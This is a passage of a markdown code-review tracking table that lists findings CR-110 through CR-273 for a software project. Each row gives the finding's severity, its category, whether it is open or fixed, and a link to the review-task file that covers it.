| CR-110 | Medium | Bug | Open | [Task 32](review-tasks/32-agent-ports.md) |
| CR-111 | Medium | Bug | Open | [Task 32](review-tasks/32-agent-ports.md) |
| CR-112 | Medium | Bug | Open | [Task 34](review-tasks/34-db-row-safety.md) |
| CR-113 | Medium | Performance | Open | [Task 34](review-tasks/34-db-row-safety.md) |
| CR-114 | Medium | Bug | Open | [Task 34](review-tasks/34-db-row-safety.md) |
| CR-115 | Medium | Code quality | Open | [Task 34](review-tasks/34-db-row-safety.md) |
| CR-116 | Medium | Code quality | Open | [Task 48](review-tasks/48-backend-dependency-injection.md) |
| CR-117 | Medium | Security | Open | [Task 61](review-tasks/61-security-secrets-at-rest-and-rendering.md) |
| CR-118 | Medium | Code quality | Open | [Task 48](review-tasks/48-backend-dependency-injection.md) |
| CR-119 | Medium | Bug | Open | [Task 30](review-tasks/30-events-feed.md) |
| CR-120 | Medium | Gap | Fixed | [Task 13](review-tasks/13-frontend-query-ownership.md) |
| CR-121 | Medium | Bug | Fixed | [Task 13](review-tasks/13-frontend-query-ownership.md) |
| CR-122 | Medium | Bug | Fixed (Task 35) | [Task 35](review-tasks/35-cockpit-panel-state.md) |
| CR-123 | Medium | Bug | Fixed (Task 35) | [Task 35](review-tasks/35-cockpit-panel-state.md) |
| CR-124 | Medium | Bug | Fixed (Task 35) | [Task 35](review-tasks/35-cockpit-panel-state.md) |
| CR-125 | Medium | Bug | Fixed | — |
| CR-126 | Medium | Bug | Fixed | [Task 15](review-tasks/15-frontend-mutation-conventions.md) |
| CR-127 | Medium | Bug | Fixed (Task 35) | [Task 35](review-tasks/35-cockpit-panel-state.md) |
| CR-128 | Medium | Bug | Partly fixed | [Task 36](review-tasks/36-cockpit-a11y-and-rendering.md) |
| CR-129 | Medium | Gap | Fixed | [Task 15](review-tasks/15-frontend-mutation-conventions.md) |
| CR-130 | Medium | Bug | Fixed (Task 35) | [Task 35](review-tasks/35-cockpit-panel-state.md) |
| CR-131 | Medium | Accessibility | Open | [Task 36](review-tasks/36-cockpit-a11y-and-rendering.md) |
| CR-132 | Medium | Bug | Open | [Task 38](review-tasks/38-editor-draft-machine.md) |
| CR-133 | Medium | Bug | Open | [Task 38](review-tasks/38-editor-draft-machine.md) |
| CR-134 | Medium | Bug | Open | [Task 38](review-tasks/38-editor-draft-machine.md) |
| CR-135 | Medium | Bug | Fixed | [Task 13](review-tasks/13-frontend-query-ownership.md) |
| CR-136 | Medium | Bug | Fixed (Task 37) | [Task 37](review-tasks/37-editor-save-integrity.md) |
| CR-137 | Medium | Bug | Fixed | [Task 39](review-tasks/39-editor-fields-and-effects.md) |
| CR-138 | Medium | Bug | Fixed | [Task 39](review-tasks/39-editor-fields-and-effects.md) |
| CR-139 | Medium | Bug | Open | [Task 38](review-tasks/38-editor-draft-machine.md) |
| CR-140 | Medium | Bug | Fixed (Task 37) | [Task 37](review-tasks/37-editor-save-integrity.md) |
| CR-141 | Medium | Gap | Open | [Task 38](review-tasks/38-editor-draft-machine.md) |
| CR-142 | Medium | Bug | Fixed (Task 37) | [Task 37](review-tasks/37-editor-save-integrity.md) |
| CR-143 | Medium | Gap | Open | [Task 14](review-tasks/14-frontend-throwing-fetchers.md) |
| CR-144 | Medium | Bug | Open | [Task 40](review-tasks/40-editor-performance.md) |
| CR-145 | Medium | Performance | Open | [Task 40](review-tasks/40-editor-performance.md) |
| CR-146 | Medium | Code quality | Fixed | [Task 39](review-tasks/39-editor-fields-and-effects.md) |
| CR-147 | Medium | Bug | Open | [Task 42](review-tasks/42-settings-forms.md) |
| CR-148 | Medium | Bug | Open | [Task 43](review-tasks/43-tasks-feature.md) |
| CR-149 | Medium | Gap | Open | [Task 42](review-tasks/42-settings-forms.md) |
| CR-150 | Medium | Gap | Open | [Task 42](review-tasks/42-settings-forms.md) |
| CR-151 | Medium | Bug | Open | [Task 41](review-tasks/41-settings-data-and-errors.md) |
| CR-152 | Medium | Bug | Open | [Task 41](review-tasks/41-settings-data-and-errors.md) |
| CR-153 | Medium | Bug | Open | [Task 43](review-tasks/43-tasks-feature.md) |
| CR-154 | Medium | Security | Open | [Task 61](review-tasks/61-security-secrets-at-rest-and-rendering.md) |
| CR-155 | Medium | Code quality | Open | [Task 55](review-tasks/55-frontend-constants-and-types.md) |
| CR-156 | Medium | Accessibility | Open | [Task 52](review-tasks/52-shared-ui-components.md) |
| CR-157 | Medium | Infra | Fixed | [Task 06](review-tasks/06-db-path-and-seed-safety.md) |
| CR-158 | Medium | Infra | Fixed (Task 08) | [Task 08](review-tasks/08-db-bootstrap-and-schema.md) |
| CR-159 | Medium | Infra | Fixed | [Task 06](review-tasks/06-db-path-and-seed-safety.md) |
| CR-160 | Medium | Infra | Partly fixed | [Task 05](review-tasks/05-test-coverage-baseline.md) |
| CR-161 | Medium | Infra | Open | [Task 04](review-tasks/04-client-server-boundaries.md) |
| CR-162 | Medium | Infra | Open | [Task 03](review-tasks/03-lint-rule-hardening.md) |
| CR-163 | Medium | Infra | Partial | [Task 39](review-tasks/39-editor-fields-and-effects.md) — suppressions removed; `eslint-plugin-eslint-comments` disable-ban deferred (new dep) |
| CR-164 | Medium | Bug | Open | [Task 05](review-tasks/05-test-coverage-baseline.md) |
| CR-165 | Medium | Infra | Open | [Task 04](review-tasks/04-client-server-boundaries.md) |
| CR-166 | Medium | Code quality | Open | [Task 04](review-tasks/04-client-server-boundaries.md) |
| CR-167 | Low | Code quality | Fixed | [Task 11](review-tasks/11-api-input-validation-settings.md) |
| CR-168 | Low | Code quality | Open | [Task 47](review-tasks/47-thin-routes-and-services.md) |
| CR-169 | Low | Code quality | Open | [Task 47](review-tasks/47-thin-routes-and-services.md) |
| CR-170 | Low | Infra | Open | [Task 03](review-tasks/03-lint-rule-hardening.md) |
| CR-171 | Low | Bug | Open | [Task 34](review-tasks/34-db-row-safety.md) |
| CR-172 | Low | Bug | Open | [Task 47](review-tasks/47-thin-routes-and-services.md) |
| CR-173 | Low | Code quality | Open | [Task 46](review-tasks/46-backend-types-cleanup.md) |
| CR-174 | Low | Code quality | Open | [Task 52](review-tasks/52-shared-ui-components.md) |
| CR-175 | Low | Code quality | Open | [Task 47](review-tasks/47-thin-routes-and-services.md) |
| CR-176 | Low | Bug | Open | [Task 58](review-tasks/58-security-webhook-auth.md) |
| CR-177 | Low | Code quality | Partly fixed | [Task 47](review-tasks/47-thin-routes-and-services.md) |
| CR-178 | Low | Performance | Open | [Task 47](review-tasks/47-thin-routes-and-services.md) |
| CR-179 | Low | Code quality | Open | [Task 47](review-tasks/47-thin-routes-and-services.md) |
| CR-180 | Low | Code quality | Open | [Task 44](review-tasks/44-engine-stores-and-constants.md) |
| CR-181 | Low | Code quality | Partly fixed | [Task 44](review-tasks/44-engine-stores-and-constants.md) |
| CR-182 | Low | Code quality | Open | [Task 46](review-tasks/46-backend-types-cleanup.md) |
| CR-183 | Low | Code quality | Open | [Task 46](review-tasks/46-backend-types-cleanup.md) |
| CR-184 | Low | Code quality | Open | [Task 44](review-tasks/44-engine-stores-and-constants.md) |
| CR-185 | Low | Performance | Open | [Task 45](review-tasks/45-flow-engine-decomposition.md) |
| CR-186 | Low | Code quality | Open | [Task 50](review-tasks/50-small-module-cleanups.md) |
| CR-187 | Low | Code quality | Fixed | Task 07 |
| CR-188 | Low | Code quality | Open | [Task 60](review-tasks/60-security-process-and-network-isolation.md) |
| CR-189 | Low | Bug | Open | [Task 60](review-tasks/60-security-process-and-network-isolation.md) |
| CR-190 | Low | Bug | Open | [Task 60](review-tasks/60-security-process-and-network-isolation.md) |
| CR-191 | Low | Bug | Fixed | [Task 24](review-tasks/24-template-snapshot-and-yaml.md) |
| CR-192 | Low | Bug | Fixed (Task 27) | [Task 27](review-tasks/27-plan-checklist-integrity.md) |
| CR-193 | Low | Bug | Fixed (Task 25) | [Task 25](review-tasks/25-wait-timers-and-poller.md) |
| CR-194 | Low | Performance | Fixed (Task 25) | [Task 25](review-tasks/25-wait-timers-and-poller.md) |
| CR-195 | Low | Code quality | Partly fixed | [Task 50](review-tasks/50-small-module-cleanups.md) |
| CR-196 | Low | Security | Open | [Task 58](review-tasks/58-security-webhook-auth.md) |
| CR-197 | Low | Code quality | Open | [Task 50](review-tasks/50-small-module-cleanups.md) |
| CR-198 | Low | Bug | Open | [Task 31](review-tasks/31-git-host-clients.md) |
| CR-199 | Low | Security | Open | [Task 60](review-tasks/60-security-process-and-network-isolation.md) |
| CR-200 | Low | Bug | Fixed | [Task 26](review-tasks/26-node-config-validation.md) |
| CR-201 | Low | Code quality | Partly fixed | [Task 44](review-tasks/44-engine-stores-and-constants.md) |
| CR-202 | Low | Code quality | Partly fixed | [Task 46](review-tasks/46-backend-types-cleanup.md) |
| CR-203 | Low | Bug | Fixed | [Task 18](review-tasks/18-terminal-outcome-writer.md) |
| CR-204 | Low | Code quality | Fixed | — |
| CR-205 | Low | Bug | Open | [Task 16](review-tasks/16-run-lifecycle-late-writes.md) |
| CR-206 | Low | Code quality | Fixed | [Task 18](review-tasks/18-terminal-outcome-writer.md) |
| CR-207 | Low | Code quality | Fixed | Task 07 |
| CR-208 | Low | Code quality | Open | [Task 49](review-tasks/49-node-kind-structure.md) |
| CR-209 | Low | Bug | Fixed (Task 22) | [Task 22](review-tasks/22-pipeline-review-resolve.md) |
| CR-210 | Low | Infra | Fixed (Task 08) | [Task 08](review-tasks/08-db-bootstrap-and-schema.md) |
| CR-211 | Low | Bug | Fixed (Task 08) | [Task 08](review-tasks/08-db-bootstrap-and-schema.md) |
| CR-212 | Low | Performance | Fixed (Task 08) | [Task 08](review-tasks/08-db-bootstrap-and-schema.md) |
| CR-213 | Low | Code quality | Open | [Task 46](review-tasks/46-backend-types-cleanup.md) |
| CR-214 | Low | Code quality | Fixed (Task 33) | [Task 33](review-tasks/33-git-and-worktree-process-safety.md) |
| CR-215 | Low | Code quality | Fixed (Task 33) | [Task 33](review-tasks/33-git-and-worktree-process-safety.md) |
| CR-216 | Low | Code quality | Open | [Task 50](review-tasks/50-small-module-cleanups.md) |
| CR-217 | Low | Code quality | Open | [Task 44](review-tasks/44-engine-stores-and-constants.md) |
| CR-218 | Low | Bug | Fixed (Task 33) | [Task 33](review-tasks/33-git-and-worktree-process-safety.md) |
| CR-219 | Low | Bug | Open | [Task 31](review-tasks/31-git-host-clients.md) |
| CR-220 | Low | Bug | Open | [Task 31](review-tasks/31-git-host-clients.md) |
| CR-221 | Low | Infra | Fixed (Task 08) | [Task 08](review-tasks/08-db-bootstrap-and-schema.md) |
| CR-222 | Low | Code quality | Fixed (Task 33) | [Task 33](review-tasks/33-git-and-worktree-process-safety.md) |
| CR-223 | Low | Bug | Open | [Task 32](review-tasks/32-agent-ports.md) |
| CR-224 | Low | Bug | Fixed (Task 33) | [Task 33](review-tasks/33-git-and-worktree-process-safety.md) |
| CR-225 | Low | Bug | Open | [Task 31](review-tasks/31-git-host-clients.md) |
| CR-226 | Low | Bug | Fixed | — |
| CR-227 | Low | Bug | Open | [Task 36](review-tasks/36-cockpit-a11y-and-rendering.md) |
| CR-228 | Low | Code quality | Partly fixed | [Task 55](review-tasks/55-frontend-constants-and-types.md) |
| CR-229 | Low | Code quality | Open | [Task 54](review-tasks/54-feature-layout-and-naming.md) |
| CR-230 | Low | Code quality | Partly fixed | [Task 54](review-tasks/54-feature-layout-and-naming.md) |
| CR-231 | Low | Code quality | Open | [Task 52](review-tasks/52-shared-ui-components.md) |
| CR-232 | Low | Code quality | Open | [Task 55](review-tasks/55-frontend-constants-and-types.md) |
| CR-233 | Low | Performance | Open | [Task 36](review-tasks/36-cockpit-a11y-and-rendering.md) |
| CR-234 | Low | Performance | Open | [Task 36](review-tasks/36-cockpit-a11y-and-rendering.md) |
| CR-235 | Low | Code quality | Fixed (Task 35) | [Task 35](review-tasks/35-cockpit-panel-state.md) |
| CR-236 | Low | Code quality | Open | [Task 36](review-tasks/36-cockpit-a11y-and-rendering.md) |
| CR-237 | Low | Bug | Fixed | [Task 15](review-tasks/15-frontend-mutation-conventions.md) |
| CR-238 | Low | Code quality | Open | [Task 55](review-tasks/55-frontend-constants-and-types.md) |
| CR-239 | Low | Code quality | Open | [Task 54](review-tasks/54-feature-layout-and-naming.md) |
| CR-240 | Low | Accessibility | Open | [Task 38](review-tasks/38-editor-draft-machine.md) |
| CR-241 | Low | Bug | Fixed | [Task 39](review-tasks/39-editor-fields-and-effects.md) |
| CR-242 | Low | Bug | Fixed | [Task 39](review-tasks/39-editor-fields-and-effects.md) |
| CR-243 | Low | Code quality | Open | [Task 52](review-tasks/52-shared-ui-components.md) |
| CR-244 | Low | Bug | Open | [Task 53](review-tasks/53-app-shell-and-settings-dedup.md) |
| CR-245 | Low | Code quality | Open | [Task 53](review-tasks/53-app-shell-and-settings-dedup.md) |
| CR-246 | Low | Code quality | Open | [Task 55](review-tasks/55-frontend-constants-and-types.md) |
| CR-247 | Low | Code quality | Open | [Task 55](review-tasks/55-frontend-constants-and-types.md) |
| CR-248 | Low | Code quality | Open | [Task 53](review-tasks/53-app-shell-and-settings-dedup.md) |
| CR-249 | Low | Code quality | Open | [Task 53](review-tasks/53-app-shell-and-settings-dedup.md) |
| CR-250 | Low | Accessibility | Open | [Task 42](review-tasks/42-settings-forms.md) |
| CR-251 | Low | Bug | Open | [Task 52](review-tasks/52-shared-ui-components.md) |
| CR-252 | Low | Code quality | Open | [Task 52](review-tasks/52-shared-ui-components.md) |
| CR-253 | Low | Code quality | Open | [Task 55](review-tasks/55-frontend-constants-and-types.md) |
| CR-254 | Low | Security | Open | [Task 59](review-tasks/59-security-credential-hygiene.md) |
| CR-255 | Low | Performance | Open | [Task 41](review-tasks/41-settings-data-and-errors.md) |
| CR-256 | Low | Code quality | Open | [Task 41](review-tasks/41-settings-data-and-errors.md) |
| CR-257 | Low | Infra | Fixed | [Task 02](review-tasks/02-typecheck-and-build-gates.md) |
| CR-258 | Low | Infra | Open | [Task 51](review-tasks/51-tsconfig-strictness.md) |
| CR-259 | Low | Code quality | Open | [Task 52](review-tasks/52-shared-ui-components.md) |
| CR-260 | Low | Docs | Open | [Task 56](review-tasks/56-docs-refresh.md) |
| CR-261 | Low | Docs | Open | [Task 56](review-tasks/56-docs-refresh.md) |
| CR-262 | Low | Infra | Partly fixed | [Task 06](review-tasks/06-db-path-and-seed-safety.md) |
| CR-263 | Low | Docs | Fixed | Task 07 |
| CR-264 | Low | Security | Open | [Task 59](review-tasks/59-security-credential-hygiene.md) |
| CR-265 | Low | Security | Open | [Task 59](review-tasks/59-security-credential-hygiene.md) |
| CR-266 | Low | Infra | Fixed | [Task 02](review-tasks/02-typecheck-and-build-gates.md) |
| CR-267 | Low | Infra | Open | [Task 05](review-tasks/05-test-coverage-baseline.md) |
| CR-268 | Low | Docs | Open | [Task 56](review-tasks/56-docs-refresh.md) |
| CR-269 | Medium | Bug | Open | [Task 16](review-tasks/16-run-lifecycle-late-writes.md) |
| CR-270 | High | Bug | Fixed | [Task 01](review-tasks/01-plan-artifact-ordering-hotfix.md) |
| CR-271 | Medium | Gap | Fixed | [Task 15](review-tasks/15-frontend-mutation-conventions.md) |
| CR-272 | Low | Bug | Fixed | [Task 06](review-tasks/06-db-path-and-seed-safety.md) |
| CR-273 | Medium | Infra | Fixed | [Task 02](review-tasks/02-typecheck-and-build-gates.md) |
